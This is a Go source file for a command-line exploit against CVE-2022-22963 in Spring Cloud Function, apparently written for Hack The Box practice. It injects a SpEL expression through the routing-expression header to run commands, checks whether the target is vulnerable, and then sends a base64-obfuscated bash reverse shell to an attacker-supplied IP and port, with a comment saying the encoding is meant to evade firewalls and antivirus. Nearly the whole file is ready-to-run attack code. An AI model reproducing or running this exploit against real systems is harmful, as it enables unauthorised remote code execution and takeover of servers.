package main

import (
    "fmt"
    "regexp"
    "strconv"
    "errors"
    "log"
    "net/http"
	"bytes"
    "strings"
    "io/ioutil"
    "os"
    "encoding/base64"

    "github.com/jessevdk/go-flags"
)

//Define ANSI colors
var colors = map[string]string{
    "black":    "\033[1;30m",
    "bred":  "\033[1;31m",
    "red":      "\033[31m",
    "bgreen":   "\033[1;32m",
    "green":    "\033[32m",
    "yellow":   "\033[1;33m",
    "brown":    "\033[33m",
    "bblue":    "\033[1;34m",
    "blue":     "\033[34m",
    "pink":     "\033[1;35m",
    "purple":   "\033[35m",
    "bcyan":    "\033[1;36m",
    "cyan":     "\033[36m",
    "bwhite":   "\033[1;37m",
    "white":    "\033[37m",
    "reset":    "\033[0m",
}


// Define the flags for the user
type Options struct {
	Target_url    string    `short:"u" long:"target-url" description:"Target/Host url where 'Spring Cloud' is running. Example: -t http://somesite.htb" required:"true"`
	Target_port int `short:"p" long:"target-port" description:"Port running the service. Example: -p 8080" required:"true"`
	Attacker_ip  string   `short:"i" long:"attacker-ip" description:"Attacker IPv4 Address. Example: -i 10.10.10.10" required:"true"`
	Listening_port int `short:"l" long:"listening-port" description:"Listening port to connect. Example: -l 1337" required:"true"`
}

// Simple function that checks if there is an error so the program terminates, printing the error
func check_error(err error) {
	if err != nil {
		log.Fatalf("%sups! something happened: %v%s\n", colors["bred"], err, colors["reset"])
	}
}

// Check if the IP address provided by the user is valid
func isValidIP(ip string) bool {
    // Define regular expression pattern for IP address
    pattern := `^((\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])$`

    // Compile regular expression
    re := regexp.MustCompile(pattern)

    // Test if input matches regular expression
    if !re.MatchString(ip) {
        return false
    }

    // Split input into four parts
    parts := regexp.MustCompile(`\.`).Split(ip, -1)

    // Check range of each part, which should be between 0 and 255
    for _, part := range parts {
        num, _ := strconv.Atoi(part)
        if num < 0 || num > 255 {
            return false
        }
    }

    return true
}

// Print a simple banner
func printBanner(){
    fmt.Printf("%s######################################################%s\n", colors["bgreen"], colors["reset"])
    fmt.Printf("%s################### %sCVE-2022-22963%s ###################%s\n", colors["bgreen"], colors["bred"], colors["bgreen"], colors["reset"])
    fmt.Printf("%s######################################################%s\n", colors["bgreen"], colors["reset"])
    fmt.Printf("                                            %sby GunzF0x%s\n\n", colors["bcyan"], colors["reset"])
}

// Pretty print to targets
func printDetails(target_url *string, target_port *int, attacker_ip *string, listen_port *int){
    star := fmt.Sprintf("%s[%s*%s]%s ", colors["bgreen"], colors["bblue"], colors["bgreen"], colors["reset"])
    fmt.Printf("%s%sTARGET: %s%s %s- %sPORT: %s%d%s\n", star, colors["bred"], colors["red"], *target_url, colors["reset"],
                                                        colors["bred"], colors["red"], *target_port, colors["reset"])
    fmt.Printf("    %sATTACKER: %s%s %s- %sLISTEN PORT: %s%d%s\n", colors["bgreen"], colors["green"], *attacker_ip, colors["reset"],
                                                        colors["bgreen"], colors["green"], *listen_port, colors["reset"])
}
// Check if the Target url has the prefix "http"
func hasHTTPPrefix(url_target string) bool {
    return strings.HasPrefix(url_target, "http://") || strings.HasPrefix(url_target, "https://")
}

// Check if the user has provided valid flags
func check_user_flags_provided(host_url *string, attacker_ip *string, host_port *int, listening_port *int) error{
    // Check host/target URL
    if *host_url == ""{
        return errors.New("you forgot to provide Host IP address (-t)")
    } else{
        if !hasHTTPPrefix(*host_url){
            fmt.Printf("%s[!] Warning! No prefix ('http://' or 'https://') found in the url '%s'. Assuming it is 'http' protocol\n%s", colors["bred"], 
                                                                                                                                       *host_url, colors["reset"])
            *host_url = fmt.Sprintf("http://%s", *host_url)
        }
    }
     // Check attacker IP
    if *attacker_ip == ""{
        return errors.New("you forgot to provide Attacker IP address (-a)")
    }else{
        if !isValidIP(*attacker_ip){
            err_text := fmt.Sprintf("you have provided an invalid Attacker IPv4 address '%s'", *attacker_ip)
            return errors.New(err_text)
        }
    }
    // Check target port
    if *host_port != 0{
        if *host_port == 0{
            return errors.New("you forgot to provide Host/Target port (-p)")
        }
        if *host_port < 0 || *host_port > 65535{
            err_text := fmt.Sprintf("you have provided an invalid Host/Target port '%d'", *host_port)
            return errors.New(err_text)
        }
    }
    // Check listening port
    if *listening_port != 0{
        if *listening_port == 0{
            return errors.New("you forgot to provide Listening port (-l)" )
        }
        if *listening_port < 0 ||  *listening_port > 65535{
            err_text := fmt.Sprintf("you have provided an invalid Listening port '%d'", *host_port)
            return errors.New(err_text)
        }
    }  
    return nil
}


// Exploit algorithm
func exploit(targetURL string, command string) (*http.Response, error) {



    exploitableURL := fmt.Sprintf("%s/functionRouter", targetURL)
    payload := fmt.Sprintf("T(java.lang.Runtime).getRuntime().exec(\"%s\")", command)
    payload_data := []byte("data")

	req, err := http.NewRequest("POST", exploitableURL, bytes.NewBuffer(payload_data))
	if err != nil {
		// handle error
	}
    
    req.Header.Set("spring.cloud.function.routing-expression", payload)
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Accept-Encoding", "gzip, deflate")
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Accept-Language", "en")
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return nil, err
    }
    return resp, nil
}

// Check if the machine is vulnerable
func isVulnerable(response *http.Response){
    bodyBytes, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	bodyString := string(bodyBytes)
    code := response.StatusCode
    indicative_text := `"error":"Internal Server Error"`
    if code == 500 && strings.Contains(bodyString, indicative_text) {
        success_text := fmt.Sprintf("%s[*] The target is %svulnerable%s!%s", colors["bgreen"], colors["bblue"], colors["bgreen"], colors["reset"])
        fmt.Println(success_text)
		return
	}
	fmt.Printf("%s[!]%s The target is not vulnerable... sorry :(%s\n", colors["bred"], colors["red"], colors["reset"])
	os.Exit(1)
}

// Prepares the command to get a reverse shell
func command_revshell(attacker_ip *string, listen_port *int) string{
    basic_command  := fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", *attacker_ip, *listen_port)
    // Encode the command to, perhaps, avoid firewalls/AVs/WAFs
    encodedCommand := base64.StdEncoding.EncodeToString([]byte(basic_command))
    
    exploitCommand := fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", encodedCommand)
    return exploitCommand
}


// MAIN
func main() {
   
    printBanner()

    star := fmt.Sprintf("%s[%s*%s]%s ", colors["bgreen"], colors["bblue"], colors["bgreen"], colors["reset"])


    // Get the flags and parse them
    var opts Options
    parser := flags.NewParser(&opts, flags.Default)

	if _, err_parser := parser.Parse(); err_parser != nil {
		// handle parsing error
		return
	}

    // Check if the user has provided valid arguments/all the flags
    err_null := check_user_flags_provided(&opts.Target_url, &opts.Attacker_ip, &opts.Target_port, &opts.Listening_port)
    check_error(err_null)

    //Print user input
    printDetails(&opts.Target_url, &opts.Target_port, &opts.Attacker_ip, &opts.Listening_port)

    // Check if the server is vulnerable to CVE-2022-22963 creating a test file
    target := fmt.Sprintf("%s:%d", opts.Target_url, opts.Target_port)
    fmt.Printf("%sChecking if the target is vulnerable to CVE-2022-22963...\n", star,)
    resp, err_test := exploit(target, `touch  /tmp/testing`)
    check_error(err_test)
    
    // Check if the target is vulnerable
    isVulnerable(resp)

    // If the target is vulnerable, let's start the party... (just throw a reverse shell)
    fmt.Printf("%sThrowing a reverse shell to %s%s%s on port %s%d%s...\n", star, colors["bgreen"], opts.Attacker_ip, colors["reset"], colors["bblue"], opts.Listening_port, colors["reset"])
    prepare_revshell := command_revshell(&opts.Attacker_ip, &opts.Listening_port)
    _, err_exploit := exploit(target, prepare_revshell)
    check_error(err_exploit)
    fmt.Printf("%sHave fun! %s=)%s\n\n", star, colors["cyan"], colors["reset"])
}
